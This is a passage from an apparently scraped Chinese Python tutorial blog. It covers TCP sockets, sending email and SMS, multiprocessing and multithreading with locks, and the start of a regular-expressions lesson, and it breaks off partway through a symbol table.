TCP套接字所谓TCP套接字就是使用TCP协议提供的传输服务来实现网络通信的编程接口。在Python中可以通过创建socket对象并指定type属性为SOCK_STREAM来使用TCP套接字。由于一台主机可能拥有多个IP地址，而且很有可能会配置多个不同的服务，所以作为服务器端的程序，需要在创建套接字对象后将其绑定到指定的IP地址和端口上。这里的端口并不是物理设备而是对IP地址的扩展，用于区分不同的服务，例如我们通常将HTTP服务跟80端口绑定，而MySQL数据库服务默认绑定在3306端口，这样当服务器收到用户请求时就可以根据端口号来确定到底用户请求的是HTTP服务器还是数据库服务器提供的服务。端口的取值范围是0~65535，而1024以下的端口我们通常称之为“著名端口”（留给像FTP、HTTP、SMTP等“著名服务”使用的端口，有的地方也称之为“周知端口”），自定义的服务通常不使用这些端口，除非自定义的是HTTP或FTP这样的著名服务。 下面的代码实现了一个提供时间日期的服务器。 from socket import socket, SOCK_STREAM, AF_INET from datetime import datetime def main(): # 1.创建套接字对象并指定使用哪种传输服务 # family=AF_INET - IPv4地址 # family=AF_INET6 - IPv6地址 # type=SOCK_STREAM - TCP套接字 # type=SOCK_DGRAM - UDP套接字 # type=SOCK_RAW - 原始套接字 server = socket(family=AF_INET, type=SOCK_STREAM) # 2.绑定IP地址和端口(端口用于区分不同的服务) # 同一时间在同一个端口上只能绑定一个服务否则报错 server.bind(('192.168.1.2', 6789)) # 3.开启监听 - 监听客户端连接到服务器 # 参数512可以理解为连接队列的大小 server.listen(512) print('服务器启动开始监听...') while True: # 4.通过循环接收客户端的连接并作出相应的处理(提供服务) # accept方法是一个阻塞方法如果没有客户端连接到服务器代码不会向下执行 # accept方法返回一个元组其中的第一个元素是客户端对象 # 第二个元素是连接到服务器的客户端的地址(由IP和端口两部分构成) client, addr = server.accept() print(str(addr) + '连接到了服务器.') # 5.发送数据 client.send(str(datetime.now()).encode('utf-8')) # 6.断开连接 client.close() if __name__ == '__main__': main() 运行服务器程序后我们可以通过Windows系统的telnet来访问该服务器，结果如下图所示。 telnet 192.168.1.2 6789 当然我们也可以通过Python的程序来实现TCP客户端的功能，相较于实现服务器程序，实现客户端程序就简单多了，代码如下所示。 from socket import socket def main(): # 1.创建套接字对象默认使用IPv4和TCP协议 client = socket() # 2.连接到服务器(需要指定IP地址和端口) client.connect(('192.168.1.2', 6789)) # 3.从服务器接收数据 print(client.recv(1024).decode('utf-8')) client.close() if __name__ == '__main__': main() 需要注意的是，上面的服务器并没有使用多线程或者异步I/O的处理方式，这也就意味着当服务器与一个客户端处于通信状态时，其他的客户端只能排队等待。很显然，这样的服务器并不能满足我们的需求，我们需要的服务器是能够同时接纳和处理多个用户请求的。下面我们来设计一个使用多线程技术处理多个用户请求的服务器，该服务器会向连接到服务器的客户端发送一张图片。 服务器端代码： from socket import socket, SOCK_STREAM, AF_INET from base64 import b64encode from json import dumps from threading import Thread def main(): # 自定义线程类 class FileTransferHandler(Thread): def __init__(self, cclient): super().__init__() self.cclient = cclient def run(self): my_dict = {} my_dict['filename'] = 'guido.jpg' # JSON是纯文本不能携带二进制数据 # 所以图片的二进制数据要处理成base64编码 my_dict['filedata'] = data # 通过dumps函数将字典处理成JSON字符串 json_str = dumps(my_dict) # 发送JSON字符串 self.cclient.send(json_str.encode('utf-8')) self.cclient.close() # 1.创建套接字对象并指定使用哪种传输服务 server = socket() # 2.绑定IP地址和端口(区分不同的服务) server.bind(('192.168.1.2', 5566)) # 3.开启监听 - 监听客户端连接到服务器 server.listen(512) print('服务器启动开始监听...') with open('guido.jpg', 'rb') as f: # 将二进制数据处理成base64再解码成字符串 data = b64encode(f.read()).decode('utf-8') while True: client, addr = server.accept() # 启动一个线程来处理客户端的请求 FileTransferHandler(client).start() if __name__ == '__main__': main() 客户端代码： from socket import socket from json import loads from base64 import b64decode def main(): client = socket() client.connect(('192.168.1.2', 5566)) # 定义一个保存二进制数据的对象 in_data = bytes() # 由于不知道服务器发送的数据有多大每次接收1024字节 data = client.recv(1024) while data: # 将收到的数据拼接起来 in_data += data data = client.recv(1024) # 将收到的二进制数据解码成JSON字符串并转换成字典 # loads函数的作用就是将JSON字符串转成字典对象 my_dict = loads(in_data.decode('utf-8')) filename = my_dict['filename'] filedata = my_dict['filedata'].encode('utf-8') with open('/Users/Hao/' + filename, 'wb') as f: # 将base64格式的数据解码成二进制数据并写入文件 f.write(b64decode(filedata)) print('图片已保存.') if __name__ == '__main__': main() 在这个案例中，我们使用了JSON作为数据传输的格式（通过JSON格式对传输的数据进行了序列化和反序列化的操作），但是JSON并不能携带二进制数据，因此对图片的二进制数据进行了Base64编码的处理。Base64是一种用64个字符表示所有二进制数据的编码方式，通过将二进制数据每6位一组的方式重新组织，刚好可以使用0~9的数字、大小写字母以及“+”和“/”总共64个字符表示从000000到111111的64种状态。维基百科上有关于Base64编码的详细讲解，不熟悉Base64的读者可以自行阅读。 说明： 上面的代码主要为了讲解网络编程的相关内容因此并没有对异常状况进行处理，请读者自行添加异常处理代码来增强程序的健壮性。 UDP套接字传输层除了有可靠的传输协议TCP之外，还有一种非常轻便的传输协议叫做用户数据报协议，简称UDP。TCP和UDP都是提供端到端传输服务的协议，二者的差别就如同打电话和发短信的区别，后者不对传输的可靠性和可达性做出任何承诺从而避免了TCP中握手和重传的开销，所以在强调性能和而不是数据完整性的场景中（例如传输网络音视频数据），UDP可能是更好的选择。可能大家会注意到一个现象，就是在观看网络视频时，有时会出现卡顿，有时会出现花屏，这无非就是部分数据传丢或传错造成的。在Python中也可以使用UDP套接字来创建网络应用，对此我们不进行赘述，有兴趣的读者可以自行研究。 网络应用开发发送电子邮件在即时通信软件如此发达的今天，电子邮件仍然是互联网上使用最为广泛的应用之一，公司向应聘者发出录用通知、网站向用户发送一个激活账号的链接、银行向客户推广它们的理财产品等几乎都是通过电子邮件来完成的，而这些任务应该都是由程序自动完成的。 就像我们可以用HTTP（超文本传输协议）来访问一个网站一样，发送邮件要使用SMTP（简单邮件传输协议），SMTP也是一个建立在TCP（传输控制协议）提供的可靠数据传输服务的基础上的应用级协议，它规定了邮件的发送者如何跟发送邮件的服务器进行通信的细节，而Python中的smtplib模块将这些操作简化成了几个简单的函数。 下面的代码演示了如何在Python发送邮件。 from smtplib import SMTP from email.header import Header from email.mime.text import MIMEText def main(): # 请自行修改下面的邮件发送者和接收者 sender = 'abcdefg@126.com' receivers = ['uvwxyz@qq.com', 'uvwxyz@126.com'] message = MIMEText('用Python发送邮件的示例代码.', 'plain', 'utf-8') message['From'] = Header('王大锤', 'utf-8') message['To'] = Header('骆昊', 'utf-8') message['Subject'] = Header('示例代码实验邮件', 'utf-8') smtper = SMTP('smtp.126.com') # 请自行修改下面的登录口令 smtper.login(sender, 'secretpass') smtper.sendmail(sender, receivers, message.as_string()) print('邮件发送完成!') if __name__ == '__main__': main() 如果要发送带有附件的邮件，那么可以按照下面的方式进行操作。 from smtplib import SMTP from email.header import Header from email.mime.text import MIMEText from email.mime.image import MIMEImage from email.mime.multipart import MIMEMultipart import urllib def main(): # 创建一个带附件的邮件消息对象 message = MIMEMultipart() # 创建文本内容 text_content = MIMEText('附件中有本月数据请查收', 'plain', 'utf-8') message['Subject'] = Header('本月数据', 'utf-8') # 将文本内容添加到邮件消息对象中 message.attach(text_content) # 读取文件并将文件作为附件添加到邮件消息对象中 with open('/Users/Hao/Desktop/hello.txt', 'rb') as f: txt = MIMEText(f.read(), 'base64', 'utf-8') txt['Content-Type'] = 'text/plain' txt['Content-Disposition'] = 'attachment; filename=hello.txt' message.attach(txt) # 读取文件并将文件作为附件添加到邮件消息对象中 with open('/Users/Hao/Desktop/汇总数据.xlsx', 'rb') as f: xls = MIMEText(f.read(), 'base64', 'utf-8') xls['Content-Type'] = 'application/vnd.ms-excel' xls['Content-Disposition'] = 'attachment; filename=month-data.xlsx' message.attach(xls) # 创建SMTP对象 smtper = SMTP('smtp.126.com') # 开启安全连接 # smtper.starttls() sender = 'abcdefg@126.com' receivers = ['uvwxyz@qq.com'] # 登录到SMTP服务器 # 请注意此处不是使用密码而是邮件客户端授权码进行登录 # 对此有疑问的读者可以联系自己使用的邮件服务器客服 smtper.login(sender, 'secretpass') # 发送邮件 smtper.sendmail(sender, receivers, message.as_string()) # 与邮件服务器断开连接 smtper.quit() print('发送完成!') if __name__ == '__main__': main() 发送短信发送短信也是项目中常见的功能，网站的注册码、验证码、营销信息基本上都是通过短信来发送给用户的。在下面的代码中我们使用了互亿无线短信平台（该平台为注册用户提供了50条免费短信以及常用开发语言发送短信的demo，可以登录该网站并在用户自服务页面中对短信进行配置）提供的API接口实现了发送短信的服务，当然国内的短信平台很多，读者可以根据自己的需要进行选择（通常会考虑费用预算、短信达到率、使用的难易程度等指标），如果需要在商业项目中使用短信服务建议购买短信平台提供的套餐服务。 import urllib.parse import http.client import json def main(): host = \"106.ihuyi.com\" sms_send_uri = \"/webservice/sms.php?method=Submit\" # 下面的参数需要填入自己注册的账号和对应的密码 params = urllib.parse.urlencode({'account': '你自己的账号', 'password' : '你自己的密码', 'content': '您的验证码是：147258。请不要把验证码泄露给其他人。', 'mobile': '接收者的手机号', 'format':'json' }) print(params) headers = {'Content-type': 'application/x-www-form-urlencoded', 'Accept': 'text/plain'} conn = http.client.HTTPConnection(host, port=80, timeout=30) conn.request('POST', sms_send_uri, params, headers) response = conn.getresponse() response_str = response.read() jsonstr = response_str.decode('utf-8') print(json.loads(jsonstr)) conn.close() if __name__ == '__main__': main()","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://www.xiaocaibi.top/tags/python/"}]},{"title":"13进程和线程","slug":"13进程和线程","date":"2021-05-16T01:17:34.000Z","updated":"2021-06-27T01:31:59.823Z","comments":true,"path":"posts/undefined.html","link":"","permalink":"http://www.xiaocaibi.top/posts/undefined.html","excerpt":"","text":"进程和线程今天我们使用的计算机早已进入多CPU或多核时代，而我们使用的操作系统都是支持“多任务”的操作系统，这使得我们可以同时运行多个程序，也可以将一个程序分解为若干个相对独立的子任务，让多个子任务并发的执行，从而缩短程序的执行时间，同时也让用户获得更好的体验。因此在当下不管是用什么编程语言进行开发，实现让程序同时执行多个任务也就是常说的“并发编程”，应该是程序员必备技能之一。为此，我们需要先讨论两个概念，一个叫进程，一个叫线程。 概念进程就是操作系统中执行的一个程序，操作系统以进程为单位分配存储空间，每个进程都有自己的地址空间、数据栈以及其他用于跟踪进程执行的辅助数据，操作系统管理所有进程的执行，为它们合理的分配资源。进程可以通过fork或spawn的方式来创建新的进程来执行其他的任务，不过新的进程也有自己独立的内存空间，因此必须通过进程间通信机制（IPC，Inter-Process Communication）来实现数据共享，具体的方式包括管道、信号、套接字、共享内存区等。 一个进程还可以拥有多个并发的执行线索，简单的说就是拥有多个可以获得CPU调度的执行单元，这就是所谓的线程。由于线程在同一个进程下，它们可以共享相同的上下文，因此相对于进程而言，线程间的信息共享和通信更加容易。当然在单核CPU系统中，真正的并发是不可能的，因为在某个时刻能够获得CPU的只有唯一的一个线程，多个线程共享了CPU的执行时间。使用多线程实现并发编程为程序带来的好处是不言而喻的，最主要的体现在提升程序的性能和改善用户体验，今天我们使用的软件几乎都用到了多线程技术，这一点可以利用系统自带的进程监控工具（如macOS中的“活动监视器”、Windows中的“任务管理器”）来证实，如下图所示。 当然多线程也并不是没有坏处，站在其他进程的角度，多线程的程序对其他程序并不友好，因为它占用了更多的CPU执行时间，导致其他程序无法获得足够的CPU执行时间；另一方面，站在开发者的角度，编写和调试多线程的程序都对开发者有较高的要求，对于初学者来说更加困难。 Python既支持多进程又支持多线程，因此使用Python实现并发编程主要有3种方式：多进程、多线程、多进程+多线程。 Python中的多进程Unix和Linux操作系统上提供了fork()系统调用来创建进程，调用fork()函数的是父进程，创建出的是子进程，子进程是父进程的一个拷贝，但是子进程拥有自己的PID。fork()函数非常特殊它会返回两次，父进程中可以通过fork()函数的返回值得到子进程的PID，而子进程中的返回值永远都是0。Python的os模块提供了fork()函数。由于Windows系统没有fork()调用，因此要实现跨平台的多进程编程，可以使用multiprocessing模块的Process类来创建子进程，而且该模块还提供了更高级的封装，例如批量启动进程的进程池（Pool）、用于进程间通信的队列（Queue）和管道（Pipe）等。 下面用一个下载文件的例子来说明使用多进程和不使用多进程到底有什么差别，先看看下面的代码。 from random import randint from time import time, sleep def download_task(filename): print('开始下载%s...' % filename) time_to_download = randint(5, 10) sleep(time_to_download) print('%s下载完成! 耗费了%d秒' % (filename, time_to_download)) def main(): start = time() download_task('Python从入门到住院.pdf') download_task('Peking Hot.avi') end = time() print('总共耗费了%.2f秒.' % (end - start)) if __name__ == '__main__': main() 下面是运行程序得到的一次运行结果。 开始下载Python从入门到住院.pdf... Python从入门到住院.pdf下载完成! 耗费了6秒 开始下载Peking Hot.avi... Peking Hot.avi下载完成! 耗费了7秒 总共耗费了13.01秒. 从上面的例子可以看出，如果程序中的代码只能按顺序一点点的往下执行，那么即使执行两个毫不相关的下载任务，也需要先等待一个文件下载完成后才能开始下一个下载任务，很显然这并不合理也没有效率。接下来我们使用多进程的方式将两个下载任务放到不同的进程中，代码如下所示。 from multiprocessing import Process from os import getpid from random import randint from time import time, sleep def download_task(filename): print('启动下载进程，进程号[%d].' % getpid()) print('开始下载%s...' % filename) time_to_download = randint(5, 10) sleep(time_to_download) print('%s下载完成! 耗费了%d秒' % (filename, time_to_download)) def main(): start = time() p1 = Process(target=download_task, args=('Python从入门到住院.pdf', )) p1.start() p2 = Process(target=download_task, args=('Peking Hot.avi', )) p2.start() p1.join() p2.join() end = time() print('总共耗费了%.2f秒.' % (end - start)) if __name__ == '__main__': main() 在上面的代码中，我们通过Process类创建了进程对象，通过target参数我们传入一个函数来表示进程启动后要执行的代码，后面的args是一个元组，它代表了传递给函数的参数。Process对象的start方法用来启动进程，而join方法表示等待进程执行结束。运行上面的代码可以明显发现两个下载任务“同时”启动了，而且程序的执行时间将大大缩短，不再是两个任务的时间总和。下面是程序的一次执行结果。 启动下载进程，进程号[1530]. 开始下载Python从入门到住院.pdf... 启动下载进程，进程号[1531]. 开始下载Peking Hot.avi... Peking Hot.avi下载完成! 耗费了7秒 Python从入门到住院.pdf下载完成! 耗费了10秒 总共耗费了10.01秒. 我们也可以使用subprocess模块中的类和函数来创建和启动子进程，然后通过管道来和子进程通信，这些内容我们不在此进行讲解，有兴趣的读者可以自己了解这些知识。接下来我们将重点放在如何实现两个进程间的通信。我们启动两个进程，一个输出Ping，一个输出Pong，两个进程输出的Ping和Pong加起来一共10个。听起来很简单吧，但是如果这样写可是错的哦。 from multiprocessing import Process from time import sleep counter = 0 def sub_task(string): global counter while counter &lt; 10: print(string, end='', flush=True) counter += 1 sleep(0.01) def main(): Process(target=sub_task, args=('Ping', )).start() Process(target=sub_task, args=('Pong', )).start() if __name__ == '__main__': main() 看起来没毛病，但是最后的结果是Ping和Pong各输出了10个，Why？当我们在程序中创建进程的时候，子进程复制了父进程及其所有的数据结构，每个子进程有自己独立的内存空间，这也就意味着两个子进程中各有一个counter变量，所以结果也就可想而知了。要解决这个问题比较简单的办法是使用multiprocessing模块中的Queue类，它是可以被多个进程共享的队列，底层是通过管道和信号量（semaphore）机制来实现的，有兴趣的读者可以自己尝试一下。 Python中的多线程在Python早期的版本中就引入了thread模块（现在名为_thread）来实现多线程编程，然而该模块过于底层，而且很多功能都没有提供，因此目前的多线程开发我们推荐使用threading模块，该模块对多线程编程提供了更好的面向对象的封装。我们把刚才下载文件的例子用多线程的方式来实现一遍。 from random import randint from threading import Thread from time import time, sleep def download(filename): print('开始下载%s...' % filename) time_to_download = randint(5, 10) sleep(time_to_download) print('%s下载完成! 耗费了%d秒' % (filename, time_to_download)) def main(): start = time() t1 = Thread(target=download, args=('Python从入门到住院.pdf',)) t1.start() t2 = Thread(target=download, args=('Peking Hot.avi',)) t2.start() t1.join() t2.join() end = time() print('总共耗费了%.3f秒' % (end - start)) if __name__ == '__main__': main() 我们可以直接使用threading模块的Thread类来创建线程，但是我们之前讲过一个非常重要的概念叫“继承”，我们可以从已有的类创建新类，因此也可以通过继承Thread类的方式来创建自定义的线程类，然后再创建线程对象并启动线程。代码如下所示。 from random import randint from threading import Thread from time import time, sleep class DownloadTask(Thread): def __init__(self, filename): super().__init__() self._filename = filename def run(self): print('开始下载%s...' % self._filename) time_to_download = randint(5, 10) sleep(time_to_download) print('%s下载完成! 耗费了%d秒' % (self._filename, time_to_download)) def main(): start = time() t1 = DownloadTask('Python从入门到住院.pdf') t1.start() t2 = DownloadTask('Peking Hot.avi') t2.start() t1.join() t2.join() end = time() print('总共耗费了%.2f秒.' % (end - start)) if __name__ == '__main__': main() 因为多个线程可以共享进程的内存空间，因此要实现多个线程间的通信相对简单，大家能想到的最直接的办法就是设置一个全局变量，多个线程共享这个全局变量即可。但是当多个线程共享同一个变量（我们通常称之为“资源”）的时候，很有可能产生不可控的结果从而导致程序失效甚至崩溃。如果一个资源被多个线程竞争使用，那么我们通常称之为“临界资源”，对“临界资源”的访问需要加上保护，否则资源会处于“混乱”的状态。下面的例子演示了100个线程向同一个银行账户转账（转入1元钱）的场景，在这个例子中，银行账户就是一个临界资源，在没有保护的情况下我们很有可能会得到错误的结果。 from time import sleep from threading import Thread class Account(object): def __init__(self): self._balance = 0 def deposit(self, money): # 计算存款后的余额 new_balance = self._balance + money # 模拟受理存款业务需要0.01秒的时间 sleep(0.01) # 修改账户余额 self._balance = new_balance @property def balance(self): return self._balance class AddMoneyThread(Thread): def __init__(self, account, money): super().__init__() self._account = account self._money = money def run(self): self._account.deposit(self._money) def main(): account = Account() threads = [] # 创建100个存款的线程向同一个账户中存钱 for _ in range(100): t = AddMoneyThread(account, 1) threads.append(t) t.start() # 等所有存款的线程都执行完毕 for t in threads: t.join() print('账户余额为: ￥%d元' % account.balance) if __name__ == '__main__': main() 运行上面的程序，结果让人大跌眼镜，100个线程分别向账户中转入1元钱，结果居然远远小于100元。之所以出现这种情况是因为我们没有对银行账户这个“临界资源”加以保护，多个线程同时向账户中存钱时，会一起执行到new_balance = self._balance + money这行代码，多个线程得到的账户余额都是初始状态下的0，所以都是0上面做了+1的操作，因此得到了错误的结果。在这种情况下，“锁”就可以派上用场了。我们可以通过“锁”来保护“临界资源”，只有获得“锁”的线程才能访问“临界资源”，而其他没有得到“锁”的线程只能被阻塞起来，直到获得“锁”的线程释放了“锁”，其他线程才有机会获得“锁”，进而访问被保护的“临界资源”。下面的代码演示了如何使用“锁”来保护对银行账户的操作，从而获得正确的结果。 from time import sleep from threading import Thread, Lock class Account(object): def __init__(self): self._balance = 0 self._lock = Lock() def deposit(self, money): # 先获取锁才能执行后续的代码 self._lock.acquire() try: new_balance = self._balance + money sleep(0.01) self._balance = new_balance finally: # 在finally中执行释放锁的操作保证正常异常锁都能释放 self._lock.release() @property def balance(self): return self._balance class AddMoneyThread(Thread): def __init__(self, account, money): super().__init__() self._account = account self._money = money def run(self): self._account.deposit(self._money) def main(): account = Account() threads = [] for _ in range(100): t = AddMoneyThread(account, 1) threads.append(t) t.start() for t in threads: t.join() print('账户余额为: ￥%d元' % account.balance) if __name__ == '__main__': main() 比较遗憾的一件事情是Python的多线程并不能发挥CPU的多核特性，这一点只要启动几个执行死循环的线程就可以得到证实了。之所以如此，是因为Python的解释器有一个“全局解释器锁”（GIL）的东西，任何线程执行前必须先获得GIL锁，然后每执行100条字节码，解释器就自动释放GIL锁，让别的线程有机会执行，这是一个历史遗留问题，但是即便如此，就如我们之前举的例子，使用多线程在提升执行效率和改善用户体验方面仍然是有积极意义的。 多进程还是多线程无论是多进程还是多线程，只要数量一多，效率肯定上不去，为什么呢？我们打个比方，假设你不幸正在准备中考，每天晚上需要做语文、数学、英语、物理、化学这5科的作业，每项作业耗时1小时。如果你先花1小时做语文作业，做完了，再花1小时做数学作业，这样，依次全部做完，一共花5小时，这种方式称为单任务模型。如果你打算切换到多任务模型，可以先做1分钟语文，再切换到数学作业，做1分钟，再切换到英语，以此类推，只要切换速度足够快，这种方式就和单核CPU执行多任务是一样的了，以旁观者的角度来看，你就正在同时写5科作业。 但是，切换作业是有代价的，比如从语文切到数学，要先收拾桌子上的语文书本、钢笔（这叫保存现场），然后，打开数学课本、找出圆规直尺（这叫准备新环境），才能开始做数学作业。操作系统在切换进程或者线程时也是一样的，它需要先保存当前执行的现场环境（CPU寄存器状态、内存页等），然后，把新任务的执行环境准备好（恢复上次的寄存器状态，切换内存页等），才能开始执行。这个切换过程虽然很快，但是也需要耗费时间。如果有几千个任务同时进行，操作系统可能就主要忙着切换任务，根本没有多少时间去执行任务了，这种情况最常见的就是硬盘狂响，点窗口无反应，系统处于假死状态。所以，多任务一旦多到一个限度，反而会使得系统性能急剧下降，最终导致所有任务都做不好。 是否采用多任务的第二个考虑是任务的类型，可以把任务分为计算密集型和I/O密集型。计算密集型任务的特点是要进行大量的计算，消耗CPU资源，比如对视频进行编码解码或者格式转换等等，这种任务全靠CPU的运算能力，虽然也可以用多任务完成，但是任务越多，花在任务切换的时间就越多，CPU执行任务的效率就越低。计算密集型任务由于主要消耗CPU资源，这类任务用Python这样的脚本语言去执行效率通常很低，最能胜任这类任务的是C语言，我们之前提到过Python中有嵌入C/C++代码的机制。 除了计算密集型任务，其他的涉及到网络、存储介质I/O的任务都可以视为I/O密集型任务，这类任务的特点是CPU消耗很少，任务的大部分时间都在等待I/O操作完成（因为I/O的速度远远低于CPU和内存的速度）。对于I/O密集型任务，如果启动多任务，就可以减少I/O等待时间从而让CPU高效率的运转。有一大类的任务都属于I/O密集型任务，这其中包括了我们很快会涉及到的网络应用和Web应用。 说明： 上面的内容和例子来自于廖雪峰官方网站的《Python教程》，因为对作者文中的某些观点持有不同的看法，对原文的文字描述做了适当的调整。 单线程+异步I/O现代操作系统对I/O操作的改进中最为重要的就是支持异步I/O。如果充分利用操作系统提供的异步I/O支持，就可以用单进程单线程模型来执行多任务，这种全新的模型称为事件驱动模型。Nginx就是支持异步I/O的Web服务器，它在单核CPU上采用单进程模型就可以高效地支持多任务。在多核CPU上，可以运行多个进程（数量与CPU核心数相同），充分利用多核CPU。用Node.js开发的服务器端程序也使用了这种工作模式，这也是当下并发编程的一种流行方案。 在Python语言中，单线程+异步I/O的编程模型称为协程，有了协程的支持，就可以基于事件驱动编写高效的多任务程序。协程最大的优势就是极高的执行效率，因为子程序切换不是线程切换，而是由程序自身控制，因此，没有线程切换的开销。协程的第二个优势就是不需要多线程的锁机制，因为只有一个线程，也不存在同时写变量冲突，在协程中控制共享资源不用加锁，只需要判断状态就好了，所以执行效率比多线程高很多。如果想要充分利用CPU的多核特性，最简单的方法是多进程+协程，既充分利用多核，又充分发挥协程的高效率，可获得极高的性能。关于这方面的内容，在后续的课程中会进行讲解。 应用案例例子1：将耗时间的任务放到线程中以获得更好的用户体验。如下所示的界面中，有“下载”和“关于”两个按钮，用休眠的方式模拟点击“下载”按钮会联网下载文件需要耗费10秒的时间，如果不使用“多线程”，我们会发现，当点击“下载”按钮后整个程序的其他部分都被这个耗时间的任务阻塞而无法执行了，这显然是非常糟糕的用户体验，代码如下所示。 import time import tkinter import tkinter.messagebox def download(): # 模拟下载任务需要花费10秒钟时间 time.sleep(10) tkinter.messagebox.showinfo('提示', '下载完成!') def show_about(): tkinter.messagebox.showinfo('关于', '作者: 骆昊(v1.0)') def main(): top = tkinter.Tk() top.title('单线程') top.geometry('200x150') top.wm_attributes('-topmost', True) panel = tkinter.Frame(top) button1 = tkinter.Button(panel, text='下载', command=download) button1.pack(side='left') button2 = tkinter.Button(panel, text='关于', command=show_about) button2.pack(side='right') panel.pack(side='bottom') tkinter.mainloop() if __name__ == '__main__': main() 如果使用多线程将耗时间的任务放到一个独立的线程中执行，这样就不会因为执行耗时间的任务而阻塞了主线程，修改后的代码如下所示。 import time import tkinter import tkinter.messagebox from threading import Thread def main(): class DownloadTaskHandler(Thread): def run(self): time.sleep(10) tkinter.messagebox.showinfo('提示', '下载完成!') # 启用下载按钮 button1.config(state=tkinter.NORMAL) def download(): # 禁用下载按钮 button1.config(state=tkinter.DISABLED) # 通过daemon参数将线程设置为守护线程(主程序退出就不再保留执行) # 在线程中处理耗时间的下载任务 DownloadTaskHandler(daemon=True).start() def show_about(): tkinter.messagebox.showinfo('关于', '作者: 骆昊(v1.0)') top = tkinter.Tk() top.title('单线程') top.geometry('200x150') top.wm_attributes('-topmost', 1) panel = tkinter.Frame(top) button1 = tkinter.Button(panel, text='下载', command=download) button1.pack(side='left') button2 = tkinter.Button(panel, text='关于', command=show_about) button2.pack(side='right') panel.pack(side='bottom') tkinter.mainloop() if __name__ == '__main__': main() 例子2：使用多进程对复杂任务进行“分而治之”。我们来完成1~100000000求和的计算密集型任务，这个问题本身非常简单，有点循环的知识就能解决，代码如下所示。 from time import time def main(): total = 0 number_list = [x for x in range(1, 100000001)] start = time() for number in number_list: total += number print(total) end = time() print('Execution time: %.3fs' % (end - start)) if __name__ == '__main__': main() 在上面的代码中，我故意先去创建了一个列表容器然后填入了100000000个数，这一步其实是比较耗时间的，所以为了公平起见，当我们将这个任务分解到8个进程中去执行的时候，我们暂时也不考虑列表切片操作花费的时间，只是把做运算和合并运算结果的时间统计出来，代码如下所示。 from multiprocessing import Process, Queue from random import randint from time import time def task_handler(curr_list, result_queue): total = 0 for number in curr_list: total += number result_queue.put(total) def main(): processes = [] number_list = [x for x in range(1, 100000001)] result_queue = Queue() index = 0 # 启动8个进程将数据切片后进行运算 for _ in range(8): p = Process(target=task_handler, args=(number_list[index:index + 12500000], result_queue)) index += 12500000 processes.append(p) p.start() # 开始记录所有进程执行完成花费的时间 start = time() for p in processes: p.join() # 合并执行结果 total = 0 while not result_queue.empty(): total += result_queue.get() print(total) end = time() print('Execution time: ', (end - start), 's', sep='') if __name__ == '__main__': main() 比较两段代码的执行结果（在我目前使用的MacBook上，上面的代码需要大概6秒左右的时间，而下面的代码只需要不到1秒的时间，再强调一次我们只是比较了运算的时间，不考虑列表创建及切片操作花费的时间），使用多进程后由于获得了更多的CPU执行时间以及更好的利用了CPU的多核特性，明显的减少了程序的执行时间，而且计算量越大效果越明显。当然，如果愿意还可以将多个进程部署在不同的计算机上，做成分布式进程，具体的做法就是通过multiprocessing.managers模块中提供的管理器将Queue对象通过网络共享出来（注册到网络上让其他计算机可以访问），这部分内容也留到爬虫的专题再进行讲解。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://www.xiaocaibi.top/tags/python/"}]},{"title":"12字符串和正则表达式","slug":"12字符串和正则表达式","date":"2021-05-15T05:17:14.000Z","updated":"2021-06-27T01:31:35.102Z","comments":true,"path":"posts/undefined.html","link":"","permalink":"http://www.xiaocaibi.top/posts/undefined.html","excerpt":"","text":"使用正则表达式正则表达式相关知识在编写处理字符串的程序或网页时，经常会有查找符合某些复杂规则的字符串的需要，正则表达式就是用于描述这些规则的工具，换句话说正则表达式是一种工具，它定义了字符串的匹配模式（如何检查一个字符串是否有跟某种模式匹配的部分或者从一个字符串中将与模式匹配的部分提取出来或者替换掉）。如果你在Windows操作系统中使用过文件查找并且在指定文件名时使用过通配符（*和?），那么正则表达式也是与之类似的用来进行文本匹配的工具，只不过比起通配符正则表达式更强大，它能更精确地描述你的需求（当然你付出的代价是书写一个正则表达式比打出一个通配符要复杂得多，要知道任何给你带来好处的东西都是有代价的，就如同学习一门编程语言一样），比如你可以编写一个正则表达式，用来查找所有以0开头，后面跟着2-3个数字，然后是一个连字号“-”，最后是7或8位数字的字符串（像028-12345678或0813-7654321），这不就是国内的座机号码吗。最初计算机是为了做数学运算而诞生的，处理的信息基本上都是数值，而今天我们在日常工作中处理的信息基本上都是文本数据，我们希望计算机能够识别和处理符合某些模式的文本，正则表达式就显得非常重要了。今天几乎所有的编程语言都提供了对正则表达式操作的支持，Python通过标准库中的re模块来支持正则表达式操作。 我们可以考虑下面一个问题：我们从某个地方（可能是一个文本文件，也可能是网络上的一则新闻）获得了一个字符串，希望在字符串中找出手机号和座机号。当然我们可以设定手机号是11位的数字（注意并不是随机的11位数字，因为你没有见过“25012345678”这样的手机号吧）而座机号跟上一段中描述的模式相同，如果不使用正则表达式要完成这个任务就会很麻烦。 关于正则表达式的相关知识，大家可以阅读一篇非常有名的博客叫《正则表达式30分钟入门教程》，读完这篇文章后你就可以看懂下面的表格，这是我们对正则表达式中的一些基本符号进行的扼要总结。 符号 解释 示例 说明 . 匹配任意字符 b.t 可以匹配bat / but / b#t / b1t等 \\w 匹配字母/数字/下划线 b\\wt 可以匹配bat / b1t / b_t等但不能匹配b#t \\s 匹配空白字符（包括\\r、\\n、\\t等） love\\syou 可以匹配love you \\d 匹配数字 \\d\\d 可以匹配01 / 23 / 99等 \\b 匹配单词的边界 \\bThe\\b ^ 匹配字符串的开始 ^The 可以匹配The开头的字符串 $ 匹配字符串的结束 .exe$ 可以匹配.exe结尾的字符串 \\W 匹配非字母/数字/下划线 b\\Wt 可以匹配b#t / b@t等但不能匹配but / b1t / b_t等 \\S 匹配非空白字符 love\\Syou 可以匹配love#you等但不能匹配love you \\D 匹配非数字 \\d\\D 可以匹配9a / 3# / 0F等 \\B 匹配非单词边界 \\Bio\\B [] 匹配来自字符集的任意单一字符 [aeiou] 可以匹配任一元音字母字符 [^] 匹配不在字符集中的任意单一字符 [^aeiou] 可以匹配任一非元音字母字符 * 匹配0次或多次 \\w* + 匹配1次或多次 \\w+ ? 匹配0次或1次 \\w? {N} 匹配N次 \\w{3} {M,} 匹配至少M次 \\w{3,} {M,N} 匹配至少M次至多N次 \\w{3,6} | 分支 foo|bar 可以匹配foo或者bar (?#) 注释 (exp) 匹配exp并捕获到自动命名的组中 (?&lt;name&gt;exp) 匹配exp并捕获到名为name的组中 (?:exp) 匹配exp但是不捕获匹配的文本 (?=exp) 匹配exp前面的位置 \\b\\w+(?=ing) 可以匹配I’m dancing中的danc (?&lt;=exp) 